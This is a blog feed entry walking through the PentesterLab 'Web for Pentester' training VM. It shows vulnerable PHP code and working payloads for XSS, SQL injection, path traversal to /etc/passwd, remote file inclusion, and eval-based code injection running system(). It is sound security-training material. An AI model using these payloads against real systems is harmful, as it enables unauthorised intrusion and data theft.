<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: writeups | Core dump overflow]]></title>
  <link href="http://chousensha.github.io/blog/categories/writeups/atom.xml" rel="self"/>
  <link href="http://chousensha.github.io/"/>
  <updated>2017-05-14T15:24:19-04:00</updated>
  <id>http://chousensha.github.io/</id>
  <author>
    <name><![CDATA[chousensha]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[Pentest lab - Web for Pentester]]></title>
    <link href="http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester/"/>
    <updated>2017-05-04T06:38:11-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/05/04/pentest-lab-web-for-pentester</id>
    <content type="html"><![CDATA[<p>Today I want to mix things up a bit, and do a challenge focused exclusively on web vulnerabilities. For the target, I will use the Web for Pentester ISO offered by <a href="https://www.pentesterlab.com/">PentesterLab</a>. They host many challenges dedicated to web hacking, and I recommend you give them a try!</p>

<!-- more -->


<p>Navigating to the VM, we are greeted by this page:</p>

<p><img class="center" src="/images/pentest/webpentester/web.png" title="&lsquo;web for pentester&rsquo; &lsquo;web for pentester&rsquo;" ></p>

<p>As you can see, we&rsquo;ve got plenty of exercises, so let&rsquo;s begin!</p>

<h3>XSS</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss1.png" title="&lsquo;xss&rsquo; &lsquo;web for pentester xss 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
<html>
Hello
&lt;?php</p>

<pre><code>echo $_GET["name"];
</code></pre>

<p>?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This is the most basic type of injection:</p>

<p>``` html</p>

<script>alert('there')</script>


<p>```</p>

<p>Now you will get an alert box and if you look in the source, you will see the exact same injection, with no filtering whatsoever.</p>

<p><strong>Example 2</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<p>$name =  $_GET[&ldquo;name&rdquo;];
$name = preg_replace(&ldquo;/<script>/&rdquo;,&ldquo;&rdquo;, $name);
$name = preg_replace(&ldquo;/&lt;\/script>/&rdquo;,&ldquo;&rdquo;, $name);
echo $name;
?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This one looks like the previous one, but in the source, we can see that the script tags are replaced with empty strings, but only for lowercase. I changed the case of the script tags to SCRIPT, and the alert box was back!</p>

<p><strong>Example 3</strong></p>

<p>The source looks like this:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello
&lt;?php</p>

<pre><code>$name =  $_GET["name"];
$name = preg_replace("/&lt;script&gt;/i","", $name);
$name = preg_replace("/&lt;\/script&gt;/i","", $name);
</code></pre>

<p>echo $name;
?></p>

<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time the script tags are filtered regardless of the case. To see what&rsquo;s going on, I inserted script tags inside a placeholder value:</p>

<p><code>plain
place&lt;script&gt;holder
</code></p>

<p>As expected, they disappear into the abyss, and the message echoed in the page is Hello placeholder . I then tried doubling the script tags:</p>

<p><code>plain
place&lt;&lt;script&gt;&gt;holder
</code></p>

<p>The message changed to <code>Hello place&lt;>holder</code> . This is great, it means we can have nested tags that will be interpreted! I built the payload to:</p>

<p><code>plain
 &lt;scr&lt;script&gt;ipt&gt;alert(1)&lt;/scr&lt;/script&gt;ipt&gt;
</code></p>

<p><strong>Example 4</strong></p>

<p>Source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/script/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>This time, the script throws an error if it sees anything resembling script tags. Luckily, we can get an XSS payload to execute in different ways. For this I used:</p>

<p><code>plain
&lt;img src='nope' onerror="alert('Got ya')" /&gt;
</code></p>

<p><strong>Example 5</strong></p>

<p>Source code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;;</p>

<p>if (preg_match(&lsquo;/alert/i&rsquo;, $_GET[&ldquo;name&rdquo;])) {
  die(&ldquo;error&rdquo;);
}
?></p>

<p>Hello &lt;?php  echo $_GET[&ldquo;name&rdquo;]; ?>
&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>All right, it looks like script tags aren&rsquo;t blacklisted anymore, but this time the alert word is. I just substituted the alert for prompt:</p>

<p>``` plain</p>

<script>prompt('Enter pwn code')</script>


<p>```</p>

<p><strong>Example 6</strong></p>

<p>PHP source:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= "<?php  echo $_GET["name"]; ?>";
</script>


<pre><code>&lt;?php require_once '../footer.php'; ?&gt;
</code></pre>

<p>```</p>

<p>This time, whatever we place inside the name variable is assigned to a variable. The page source looks like this:</p>

<p>``` html
Hello</p>

<script>
    var $a= "hacker";
</script>


<p>```</p>

<p>We want to build on the existing code and add our own. This means we will have to close the quotes and add our payload. First, I inserted something to see the changes:</p>

<p><code>plain
hacker";INJECTION
</code></p>

<p>And in the HTML code I saw this:</p>

<p><code>plain
var $a= "hacker";INJECTION";
</code></p>

<p>The part up to the first semicolon is what we want, then we have to place our payload, but a stray doublequote and semicolon remain. To get rid of them, I commented them out, and the final injection looked like this:</p>

<p><code>plain
hacker";alert("not enough");//
</code></p>

<p>And in the source it is rendered the following way:</p>

<p><code>plain
var $a= "hacker";alert("not enough");//";
</code></p>

<p><strong>Example 7</strong></p>

<p>PHP code:</p>

<p>``` php
&lt;?php require_once &lsquo;../header.php&rsquo;; ?>
Hello</p>

<script>
    var $a= '<?php  echo htmlentities($_GET["name"]); ?>';
</script>


<p>&lt;?php require_once &lsquo;../footer.php&rsquo;; ?>
```</p>

<p>It appears that now there is encoding performed on the name variable to prevent the previous type of bypass. Let&rsquo;s see how the source looks with the previous payload:</p>

<p><code>plain
var $a= 'hacker&amp;quot;;alert(&amp;quot;not enough&amp;quot;);//';
</code></p>

<p>The attack was nullified, but if you look at the <code>htmlentities</code> PHP manual page, you will see that, if not otherwise specified, the default flag is ENT_COMPAT, which converts double-quotes and leaves single-quotes alone. So all I had to do was replace the double-quotes with single-quotes:</p>

<p><code>plain
hacker';alert('still not enough');//
</code></p>

<p>And this is translated in the HTML as:</p>

<p><code>plain
var $a= 'hacker';alert('stillnot enough');//';
</code></p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss8.png" title="&lsquo;xss 8&rsquo; &lsquo;web for pentester xss 8&rsquo;" ></p>

<p>This looks a little different, we input something and it gets echoed back in a greeting: HELLO something</p>

<p>Source code:</p>

<p>``` php
&lt;?php
  require_once &lsquo;../header.php&rsquo;;</p>

<p>  if (isset($_POST[&ldquo;name&rdquo;])) {</p>

<pre><code>echo "HELLO ".htmlentities($_POST["name"]);
</code></pre>

<p>  }
?>
<form action="<?php echo $_SERVER['PHP_SELF']; ?>&ldquo; method="POST&rdquo;>
  Your name:<input type="text" name="name" />
  <input type="submit" name="submit"/></p>

<p>&lt;?php</p>

<p>  require_once &lsquo;../footer.php&rsquo;;</p>

<p>?>
```</p>

<p>PHP_SELF returns the currently executing script and its path from the root folder. In our case, where the URL is <a href="http://192.168.217.138/xss/example8.php">http://192.168.217.138/xss/example8.php</a> , PHP_SELF would be /xss/example8.php .</p>

<p><a href="http://form.guide/php-form/php-form-action-self.html">The PHP_SELF variable</a> is vulnerable to XSS if not enclosed within htmlentities(). Which means we can put our payload in the URL: <a href="http://192.168.217.138/xss/example8.php/INJECTION">http://192.168.217.138/xss/example8.php/INJECTION</a></p>

<p>Now, we need to take note of how to build the payload:</p>

<p><code>html
HELLO hacker&lt;form action="/xss/example8.php/hacker" method="POST"&gt;
</code></p>

<p>My successful injection was:</p>

<p><code>plain
hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"
</code></p>

<p>And the source now looks like this:</p>

<p><code>html
&lt;form action="/xss/example8.php/hacker"&gt;&lt;script&gt;alert(9000)&lt;/script&gt;"" method="POST"&gt;
</code></p>

<p>The first double-quote and <code>></code> closed the form action part, then came the injection, and then I put another double-quote to keep company to the stray one that remained.</p>

<p><strong>Example9</strong></p>

<p><img class="center" src="/images/pentest/webpentester/xss9.png" title="&lsquo;xss 9&rsquo; &lsquo;dom xss&rsquo;" ></p>

<p>Whatever we put after the pound sign gets rendered on the page. Here&rsquo;s the code that does it:</p>

<p>``` html</p>

<script>
  document.write(location.hash.substring(1));
</script>


<p>```</p>

<p>First, we have to understand the <a href="https://www.w3schools.com/jsref/jsref_substring.asp">substring</a> method:</p>

<blockquote><p> string.substring(start, end)</p>

<p>This method extracts the characters in a string between &ldquo;start&rdquo; and &ldquo;end&rdquo;, not including &ldquo;end&rdquo; itself.
Characters start at index 0</p></blockquote>

<p>And the <a href="https://www.w3schools.com/jsref/prop_loc_hash.asp">location.hash</a> returns the anchor part of the URL. So if our URL is <a href="http://192.168.217.138/xss/example9.php#moo">http://192.168.217.138/xss/example9.php#moo</a> , it will return #moo . And combined with the substring function, whatever comes after the hash is written to the page, as we saw at the beginning.</p>

<p>This page is vulnerable to DOM-based XSS, where a modification the DOM environment affects how the client code is running. Just put the payload after the hash sign, and reload the page (I had to use Chrome to see the alert):</p>

<p><code>plain
http://192.168.217.138/xss/example9.php#&lt;script&gt;alert('Bye')&lt;/script&gt;
</code></p>

<h3>SQL injections</h3>

<p><strong>Example1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql1.png" title="&lsquo;sqli&rsquo; &lsquo;sql injection&rsquo;" ></p>

<p>Ok, before tampering with anything, let&rsquo;s look at the source:</p>

<p>``` php
&lt;?php</p>

<p>  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";  
$result = mysql_query($sql);
if ($result) {
    ?&gt;
    &lt;table class='table table-striped'&gt;
  &lt;tr&gt;&lt;th&gt;id&lt;/th&gt;&lt;th&gt;name&lt;/th&gt;&lt;th&gt;age&lt;/th&gt;&lt;/tr&gt;
    &lt;?php
    while ($row = mysql_fetch_assoc($result)) {
        echo "&lt;tr&gt;";
            echo "&lt;td&gt;".$row['id']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['name']."&lt;/td&gt;";
            echo "&lt;td&gt;".$row['age']."&lt;/td&gt;";
        echo "&lt;/tr&gt;";
    }   
    echo "&lt;/table&gt;";
}
</code></pre>

<p>  require_once &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>So, the code looks in the users table for whatever we give it, and if a match is found, it displays some info. You can see there is no filtering on our input, and the DB query is <code>SELECT * FROM users where name=&lsquo;input&rsquo;</code>. This is trivial to bypass, by using <code>root' or 1=1&mdash; </code> (there is a space after &mdash;), and don&rsquo;t forget to URL encode for it to work! The query now becomes <code>SELECT * FROM users where name=&lsquo;root&rsquo; or 1=1&mdash; &lsquo;</code>, and the stray quote is commented out.</p>

<p><img class="center" src="/images/pentest/webpentester/sqlinj1.png" title="&lsquo;sqli&rsquo; &lsquo;sqli results&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>This example looks the same like the previous one, but the difference is in the code:</p>

<p>``` php
if (preg_match(&lsquo;/ /&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Basically, the space characters are being filtered out. However, we can achieve the same results by using tabs (<code>\t</code>), which would change the previous injection to: <code>SELECT * FROM users where name=&lsquo;root&rsquo; or  1=1#</code>, where the same outcome is achieved by substituting the spaces for tabs and the comment characters from <code>&mdash; </code> to <code>#</code>. Again, don&rsquo;t forget URL encoding though!</p>

<p><strong>Example3</strong></p>

<p>Same-looking page, but slightly different code:</p>

<p>``` php
if (preg_match(&lsquo;/\s+/&rsquo;, $_GET[&ldquo;name&rdquo;])) {</p>

<pre><code>    die("ERROR NO SPACE");  
}
$sql = "SELECT * FROM users where name='";
$sql .= $_GET["name"]."'";

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>This time, a regular expression prevents the use of any whitespace characters, including tabs, carriage returns, etc. It is possible to bypass this by using <a href="http://www.sqlinjection.net/comments/">C-style comments</a>: <code>/**/</code>. Here, our injection would be:</p>

<p><code>plain
'/**/or/**/1=1#
</code></p>

<p>And the DB query would look like this:</p>

<p><code>sql
SELECT * FROM users where name='root'/**/or/**/1=1#'
</code></p>

<p>As always, don&rsquo;t forget to URL encode when injecting!</p>

<p><strong>Example4</strong></p>

<p>Here, the URL looks just a tiny bit different: <a href="http://192.168.217.138/sqli/example4.php?id=2">http://192.168.217.138/sqli/example4.php?id=2</a></p>

<p>And the code:</p>

<p>``` php
$sql=&ldquo;SELECT * FROM users where id=&rdquo;;</p>

<pre><code>$sql.=mysql_real_escape_string($_GET["id"])." ";
$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>So, the query performed is <code>SELECT * FROM users where id=INPUT </code>, but this time, the <code>mysql_real_escape_string</code> function is used to escape the characters: <code>\x00, \n, \r, \, &lsquo;, &ldquo; and \x1a</code>. All that protection is for naught however, because the id parameter is an integer, where there is no need to use quotes. So I injected <code>2 or 1=1&mdash; </code> and again saw all results.</p>

<p><strong>Example5</strong></p>

<p>We have the same example as the previous one, but with some modifications to the underlying code:</p>

<p>``` php
if (!preg_match(&lsquo;/^[0-9]+/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>The regular expression will make the script throw an error and stop executing if it encounters non-integer characters in the input. But the check is only made at the beginning of the input, as can be seen from the fact that there is a <code>^</code>, but not a <code>$</code> delimiter for the end. Again, the injection is trivial: <code>id=2 or 1=1&mdash; </code>.</p>

<p><strong>Example6</strong></p>

<p>The developer tried to fix the previous mistake with:</p>

<p>``` php
if (!preg_match(&lsquo;/[0-9]+$/&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"] ;


$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>Now the code checks for the end of the string to be an integer, but not for the beginning xD Well, we can inject without worrying that we have to comment something afterwards: <code>id=2 or 1=1</code></p>

<p><strong>Example7</strong></p>

<p>Finally, the code checks for integers both at the beginning and the end:</p>

<p>``` php
if (!preg_match(&lsquo;/^&ndash;?[0-9]+$/m&rsquo;, $_GET[&ldquo;id&rdquo;])) {</p>

<pre><code>    die("ERROR INTEGER REQUIRED");  
}
$sql = "SELECT * FROM users where id=";
$sql .= $_GET["id"];

$result = mysql_query($sql);
</code></pre>

<p>```</p>

<p>There is something new in this regex: a PCRE_MULTILINE pattern modifier. Let&rsquo;s see what this does:</p>

<blockquote><p> m (PCRE_MULTILINE)</p>

<p>   By default, PCRE treats the subject string as consisting of a single &ldquo;line&rdquo; of characters
(even if it actually contains several newlines). The &ldquo;start of line&rdquo; metacharacter (^) matches
only at the start of the string, while the &ldquo;end of line&rdquo; metacharacter ($) matches only at the
end of the string, or before a terminating newline (unless D modifier is set). This is the same
as Perl. When this modifier is set, the &ldquo;start of line&rdquo; and &ldquo;end of line&rdquo; constructs match
immediately following or immediately before any newline in the subject string, respectively, as
well as at the very start and end. This is equivalent to Perl&rsquo;s /m modifier. If there are no
&ldquo;\n&rdquo; characters in a subject string, or no occurrences of ^ or $ in a pattern, setting this
modifier has no effect.</p></blockquote>

<p>So, the regex checks will be performed correctly on the first line, but we can insert new lines and inject our payload there, and no checks will be performed! With the payload <code>id=2%0A or 1=1</code>, a new line has been injected, and then the rest of the payload.</p>

<p><strong>Example8</strong></p>

<p><img class="center" src="/images/pentest/webpentester/sql8.png" title="&lsquo;sqli&rsquo; &lsquo;sqli 8&rsquo;" ></p>

<p>This example introduces the ORDER BY statement:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY `";
$sql .= mysql_real_escape_string($_GET["order"])."`";
$result = mysql_query($sql);
</code></p>

<p>The SQL query looks like this:</p>

<p><code>sql
SELECT * FROM users ORDER BY `INPUT`;
</code></p>

<p>For this exploitation, I used <a href="http://www.securityidiots.com/Web-Pentest/SQL-Injection/group-by-and-order-by-sql-injection.html#blind">this very helpful article about time-based injection in the ORDER BY clause</a>:</p>

<p><code>plain
order=name`,(select sleep(3) from dual where database() like database())#
</code></p>

<p>First, the successful injection will be reflected by the time it takes to load the page, specified inside the <a href="https://dev.mysql.com/doc/refman/5.7/en/miscellaneous-functions.html#function_sleep">SLEEP</a> function. The <a href="http://www.w3resource.com/sql/sql-dual-table.php">DUAL table</a> is a special table that can be used in queries that don&rsquo;t need data from any tables. <a href="http://www.bitbybit.dk/carsten/blog/?p=201">DATABASE()</a> returns the value of the currently selected  DB, and the <a href="https://www.tutorialspoint.com/sql/sql-like-clause.htm">LIKE</a> operator is used to compare a value with another similar one. For the injection to work, don&rsquo;t forget to URL encode! Now, let&rsquo;s see how the full query would look like:</p>

<p><code>sql
SELECT * FROM users ORDER BY `name`,(select sleep(3) from dual where database() like database())#`;
</code></p>

<p>That LIKE statement is useful, because it induces a condition that is matched by the SELECT statement.</p>

<p><strong>Example9</strong></p>

<p>Source code:</p>

<p><code>php
$sql = "SELECT * FROM users ORDER BY ";
$sql .= mysql_real_escape_string($_GET["order"]);
$result = mysql_query($sql);
</code></p>

<p>No more backticks here. I used the same payload as in the previous example, but without the backticks (and URL encoded):</p>

<p><code>plain
order=(select sleep(3) from dual where database() like database())#
</code></p>

<h3>Directory traversal</h3>

<p><strong>Example1</strong></p>

<p>If you inspect the image link, you will see: <code>dirtrav/example1.php?file=hacker.png</code>. The source code for this challenge is:</p>

<p>``` php
&lt;?php</p>

<p>$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file;</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>header(&lsquo;Cache-Control: must-revalidate, post-check=0, pre-check=0&rsquo;);
header(&lsquo;Cache-Control: public&rsquo;);
header(&lsquo;Content-Disposition: inline; filename=&ldquo;&rsquo; . basename($path) . &lsquo;&rdquo;;&rsquo;);
header(&lsquo;Content-Transfer-Encoding: binary&rsquo;);
header(&lsquo;Content-Length: &rsquo; . filesize($path));</p>

<p>$handle = fopen($path, &lsquo;rb&rsquo;);</p>

<p>do {
$data = fread($handle, 8192);
if (strlen($data) == 0) {
break;
}
echo($data);
} while (true);</p>

<p>fclose($handle);
exit();</p>

<p>?>
```</p>

<p>There is no filtering involved, so I displayed the <em>/etc/passwd</em> file with: <a href="http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd">http://192.168.217.138/dirtrav/example1.php?file=../../../../../etc/passwd</a></p>

<p><img class="center" src="/images/pentest/webpentester/passwd.png" title="&lsquo;passwd file&rsquo; &lsquo;passd file&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The path for this one is <code>dirtrav/example2.php?file=/var/www/files/hacker.png</code>. In the code, we are only interested in the parts that manipulate the file to be included:</p>

<p>``` php
$file = $_GET[&lsquo;file&rsquo;];</p>

<p>if (!(strstr($file,&ldquo;/var/www/files/&rdquo;)))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The script tries to enforce the location of the file to be in /var/www/files, but we can leave it as it is and just go up a few directories and include the passwd file again: <code>file=/var/www/files/../../../etc/passwd</code>.</p>

<p><strong>Example 3</strong></p>

<p>Here is the path: <code>dirtrav/example3.php?file=hacker</code></p>

<p>And the code:</p>

<p>``` php
$UploadDir = &lsquo;/var/www/files/&rsquo;;</p>

<p>if (!(isset($_GET[&lsquo;file&rsquo;])))</p>

<pre><code>die();
</code></pre>

<p>$file = $_GET[&lsquo;file&rsquo;];</p>

<p>$path = $UploadDir . $file.&ldquo;.png&rdquo;;
// Simulate null-byte issue that used to be in filesystem related functions in PHP
$path = preg_replace(&lsquo;/\x00.*/&rsquo;,&ldquo;&rdquo;,$path);</p>

<p>if (!is_file($path))</p>

<pre><code>die();
</code></pre>

<p>```</p>

<p>The code gives the hint of exploiting this: the null byte, which will make the system ignore anything that comes after it. So the extension check will be bypassed: <code>file=../../../../../etc/passwd%00</code></p>

<h3>File Include</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/fileinc.png" title="&lsquo;file includes&rsquo; &lsquo;file inclusion&rsquo;" ></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
    include($_GET["page"]);

} 
</code></pre>

<p>?>
```</p>

<p>There is no validation performed on the file to be included. For this challenge, PentesterLab provides a sample include file that calls phpinfo() at <a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></p>

<p>Just include the above file to see the output of phpinfo(): <code>page=<a href="http://assets.pentesterlab.com/test_include.txt">http://assets.pentesterlab.com/test_include.txt</a></code></p>

<p><img class="center" src="/images/pentest/webpentester/phpinfo.png" title="&lsquo;phpinfo&rsquo; &lsquo;phpinfo output&rsquo;" ></p>

<p><strong>Example2</strong></p>

<p>The URL is slightly different now: <a href="http://192.168.217.138/fileincl/example2.php?page=intro">http://192.168.217.138/fileincl/example2.php?page=intro</a></p>

<p>And the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>if ($_GET["page"]) {
$file = $_GET["page"].".php";
// simulate null byte issue
$file = preg_replace('/\x00.*/',"",$file);
    include($file);
} 
</code></pre>

<p>?>
```</p>

<p>So the code automatically appends a PHP extension to the file, but is also vulnerable to null bytes. I included the same file as in the previous example, with a <code>%00</code> at the end: <code>page=<a href="http://assets.pentesterlab.com/test_include.txt%00">http://assets.pentesterlab.com/test_include.txt%00</a></code></p>

<h3>Code injection</h3>

<p><strong>Example 1</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1&rsquo;" ></p>

<p>Source code:</p>

<p>``` php
&lt;?php
  $str=&ldquo;echo \"Hello &rdquo;.$_GET[&lsquo;name&rsquo;].&ldquo;!!!\&rdquo;;&ldquo;;</p>

<p>  eval($str);
?>
```</p>

<p>The string <code>echo &ldquo;Hello hacker!!!&rdquo;;</code> is passed to eval. Whatever else we input after the name variable comes right after hacker and before the exclamation signs: Hello hacker@!!! (with an example of adding @ after hacker). However, if we input a double-quote, we get an error:</p>

<p><code>plain
Parse error: syntax error, unexpected '!', expecting ',' or ';' in /var/www/codeexec/example1.php(6) : eval()'d code on line 1
</code></p>

<p>That is because eval now has to evaluate the broken syntax of <code>echo &ldquo;Hello hacker&rdquo;!!!&ldquo;;</code>. We can take advantage of this by appending a command and then commenting out the remaining <code>!!!&rdquo;;</code>:</p>

<p><code>plain
name=hacker" . system('hostname');//
</code></p>

<p>URL encode it and you will see the output:</p>

<p><img class="center" src="/images/pentest/webpentester/codeinj1.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 1 success&rsquo;" ></p>

<p>This worked because what eval saw was: <code>echo &ldquo;Hello hacker&rdquo; . system(&lsquo;hostname&rsquo;);//!!!&ldquo;;</code></p>

<p><strong>Example 2</strong></p>

<p><img class="center" src="/images/pentest/webpentester/code2.png" title="&lsquo;code injection&rsquo; &lsquo;code injection 2&rsquo;" ></p>

<p>PHP code:</p>

<p>``` php
&lt;?php
class User{
  public $id, $name, $age;
  function __construct($id, $name, $age){</p>

<pre><code>$this-&gt;name= $name;
$this-&gt;age = $age;
$this-&gt;id = $id;
</code></pre>

<p>  } <br/>
}
  require_once(&lsquo;../header.php&rsquo;);
  require_once(&lsquo;../sqli/db.php&rsquo;);</p>

<pre><code>$sql = "SELECT * FROM users ";

$order = $_GET["order"];
$result = mysql_query($sql);
</code></pre>

<p>  if ($result) {</p>

<pre><code>    while ($row = mysql_fetch_assoc($result)) {
  $users[] = new User($row['id'],$row['name'],$row['age']);
}
if (isset($order)) { 
  usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
}
}   

    ?&gt;
</code></pre>

<table class='table table-striped' >
        <tr>
            <th><a href="example2.php?order=id">id</th>
            <th><a href="example2.php?order=name">name</th>
            <th><a href="example2.php?order=age">age</th>
        </tr>
        <?php

    foreach ($users as $user) {  
            echo "<tr>";
                echo "<td>".$user->id."</td>";
                echo "<td>".$user->name."</td>";
                echo "<td>".$user->age."</td>";
            echo "</tr>";
        }   
        echo "</table>


<p>  require &lsquo;../footer.php&rsquo;;
?>
```</p>

<p>The line to focus on is:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>Here, the <a href="https://www.pentesterlab.com/exercises/web_for_pentester/course">PentesterLab course</a> explains the vulnerability exists in the <a href="https://secure.php.net/manual/en/function.usort.php">usort(array, user-defined function)</a> function, because it uses <a href="https://secure.php.net/manual/en/function.create-function.php">create_function(args, code)</a>, which is used to create an anonymous (lambda-style) function. <strong>create_function</strong> is vulnerable to unfiltered input because it uses eval() at its core. There is a known <a href="http://www.exploitalert.com/view-details.html?id=10264">exploit</a> that allows code injection and executing the code without creating and calling the function. Let&rsquo;s see how this works:</p>

<p><strong>create_function</strong> is a ZEND_FUNCTION defined in <em>zend_builtin_functions.c</em>. Here is part of the vulnerable code:</p>

<p><img class="center" src="/images/pentest/webpentester/ffs.png" title="&lsquo;c code&rsquo; &lsquo;vulnerable code&rsquo;" ></p>

<p>The folks at PentesterLab were nice enough to help me understand this, I was in one of those states where you don&rsquo;t see the forest from the trees! Basically, the code for the lambda function is the string inside curly brackets, and there is no filtering for {}. So later, this same user-supplied string gets evaluated by zend_eval_string. We can inject code in the $order parameter, so our code gets in this line:</p>

<p><code>php
usort($users, create_function('$a, $b', 'return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');'));
</code></p>

<p>And that line will be used in the format string. The payload I used is : <code>order=id);}echo &lsquo;INJECTION SUCCESSFUL&rsquo;;//</code>. Now, inside eval(), the lambda function without injection looks something like this:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.',$b-&gt;'.$order.');}
</code></p>

<p>Let&rsquo;s deconstruct it step by step. Adding <strong>);</strong> closes the call to strcmp, but leaves garbage behind and also an unclosed {} , because the end curly bracket is now part of the discarded code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');,$b-&gt;'.$order.');}
</code></p>

<p>Adding a closing curly bracket correctly closes the format string, so now we have:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');},$b-&gt;'.$order.');}
</code></p>

<p>To test where I was with the injection, I left it at that and got this error:</p>

<p><code>plain
Parse error: syntax error, unexpected ',' in /var/www/codeexec/example2.php(22) : runtime-created function on line 1 Warning: usort() expects parameter 2 to be a valid callback, no array or string given in /var/www/codeexec/example2.php on line 22
</code></p>

<p>So the code picks up after the curly bracket, we know we have to comment out the rest. And between the curly bracket and the comment characters we can put our code:</p>

<p><code>plain
function LAMBDA_TEMP_FUNCNAME (a,b){return strcmp($a-&gt;'.$order.');}echo 'INJECTION SUCCESSFUL';//,$b-&gt;'.$order.');}
</code></p>

<p>And the result:</p>

<p><img class="center" src="/images/pentest/webpentester/codeinj2.png" title="&lsquo;code injection 2&rsquo; &lsquo;code injection&rsquo;" ></p>

<p>eval() now sees a strcmp, which is executed (but only with 1 parameter, hence the warning). Then eval goes further, sees our code and executes it (the warning doesn&rsquo;t stop the execution). And finally, eval reaches the leftovers, which have been commented out, so it does nothing.</p>

<p>This here was my favorite part in all the challenge!</p>

<p><strong>Example 3</strong></p>

<p>Here we have the familiar hello hacker message, but with a twist on the URL: <a href="http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer">http://192.168.217.138/codeexec/example3.php?new=hacker&amp;pattern=/lamer/&amp;base=Hello%20lamer</a></p>

<p>Let&rsquo;s see the code:</p>

<p>``` php
&lt;?php</p>

<pre><code>echo preg_replace($_GET["pattern"], $_GET["new"], $_GET["base"]);
</code></pre>

<p>?>
```</p>

<p>Ok, preg_replace searches inside the base parameter (Hello lamer) for matches to the pattern parameter (hacker) and replaces them with what&rsquo;s in the new parameter (hacker).</p>

<p>The problem with preg_replace is that it can be passed the modifier <a href="https://secure.php.net/manual/en/reference.pcre.pattern.modifiers.php#reference.pcre.pattern.modifiers.eval">e (PREG_REPLACE_EVAL)</a> that causes PHP to <a href="https://bitquark.co.uk/blog/2013/07/23/the_unexpected_dangers_of_preg_replace">execute the replacement value</a>.</p>

